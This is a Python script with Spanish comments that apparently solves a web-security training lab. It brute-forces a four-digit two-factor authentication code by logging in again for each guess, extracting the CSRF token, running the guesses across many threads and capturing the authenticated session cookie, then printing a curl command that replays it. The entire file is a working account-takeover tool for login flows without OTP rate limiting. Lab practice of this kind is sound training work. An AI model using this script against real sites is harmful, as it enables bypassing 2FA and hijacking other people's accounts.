#!/usr/bin/env python3
"""
Brute-force del codigo 2FA en el lab "2FA bypass using a brute-force attack".

Constraints observadas:
  - CSRF token rota en cada response (extraer del HTML).
  - El server kickea la sesion al SEGUNDO intento de OTP.
  - Por ende, 1 intento util por sesion. Cada candidato requiere re-login completo.

Flujo por candidato (4 requests):
  1. GET  /login   -> extraer csrf
  2. POST /login   -> auth carlos:montoya, redirect 302 /login2
  3. GET  /login2  -> extraer csrf del paso 2
  4. POST /login2  -> probar mfa-code
       302 /my-account?id=carlos -> WIN
       200 (Incorrect security code) -> siguiente candidato

Uso:
    python3 bruteforce.py --host <lab-host> [--workers 30] [--start 0] [--end 10000]
"""

import argparse
import concurrent.futures
import re
import sys
import threading

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

CSRF_RE = re.compile(rb'name="csrf"\s+value="([^"]+)"')

FOUND = threading.Event()
RESULT = {}


def make_session(retries: int = 2) -> requests.Session:
    s = requests.Session()
    retry = Retry(total=retries, backoff_factor=0.2,
                  status_forcelist=[500, 502, 503, 504])
    s.mount("https://", HTTPAdapter(max_retries=retry, pool_connections=50,
                                    pool_maxsize=50))
    return s


def extract_csrf(content: bytes) -> str | None:
    m = CSRF_RE.search(content)
    return m.group(1).decode() if m else None


def try_code(host: str, code: int, target_user: str = "carlos",
             target_pwd: str = "montoya") -> tuple[int, int, str | None]:
    """Devuelve (code, status_code_de_login2, post_session_si_gano)."""
    if FOUND.is_set():
        return code, -1, None

    s = make_session()
    base = f"https://{host}"

    try:
        # 1. GET /login -> csrf
        r = s.get(f"{base}/login", timeout=15, allow_redirects=False)
        csrf1 = extract_csrf(r.content)
        if not csrf1:
            return code, -2, None

        # 2. POST /login -> auth, 302 a /login2
        r = s.post(f"{base}/login",
                   data={"csrf": csrf1, "username": target_user,
                         "password": target_pwd},
                   timeout=15, allow_redirects=False)
        if r.status_code != 302:
            return code, -3, None

        # 3. GET /login2 -> csrf del paso 2
        r = s.get(f"{base}/login2", timeout=15, allow_redirects=False)
        csrf2 = extract_csrf(r.content)
        if not csrf2:
            return code, -4, None

        # 4. POST /login2 -> probar mfa-code
        r = s.post(f"{base}/login2",
                   data={"csrf": csrf2, "mfa-code": f"{code:04d}"},
                   timeout=15, allow_redirects=False)
    except requests.RequestException:
        return code, -5, None

    if r.status_code == 302 and "/my-account" in r.headers.get("Location", ""):
        post_session = s.cookies.get("session")
        RESULT.update({"code": f"{code:04d}", "session": post_session,
                       "location": r.headers["Location"]})
        FOUND.set()
        return code, r.status_code, post_session
    return code, r.status_code, None


def main():
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument("--host", required=True)
    p.add_argument("--target", default="carlos")
    p.add_argument("--password", default="montoya")
    p.add_argument("--workers", type=int, default=30)
    p.add_argument("--start", type=int, default=0)
    p.add_argument("--end", type=int, default=10000)
    args = p.parse_args()

    print(f"[*] Target: {args.host}")
    print(f"[*] Account: {args.target}:{args.password}")
    print(f"[*] Rango: {args.start:04d}..{args.end-1:04d} ({args.workers} workers)")

    tried = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as ex:
        futures = {ex.submit(try_code, args.host, c, args.target,
                              args.password): c
                   for c in range(args.start, args.end)}
        try:
            for fut in concurrent.futures.as_completed(futures):
                code, status, post_session = fut.result()
                tried += 1
                if post_session:
                    print(f"\n[+] OTP CORRECTO: {code:04d}")
                    print(f"    Status: {status}")
                    print(f"    Session post-2FA: {post_session}")
                    break
                if tried % 200 == 0:
                    print(f"    {tried}/{args.end - args.start} probados, "
                          f"ultimo: {code:04d} status {status}")
        except KeyboardInterrupt:
            FOUND.set()
            print("\n[!] Interrumpido")

    if RESULT:
        print("\n=== Lab solved ===")
        print(f"  mfa-code: {RESULT['code']}")
        print(f"  Cookie session post-2FA: {RESULT['session']}")
        print(f"\nReproducir:")
        print(f"  curl -i 'https://{args.host}{RESULT['location']}' \\")
        print(f"      -H 'Cookie: session={RESULT['session']}'")
        sys.exit(0)
    else:
        print("\n[!] No encontrado en el rango.")
        sys.exit(1)


if __name__ == "__main__":
    main()
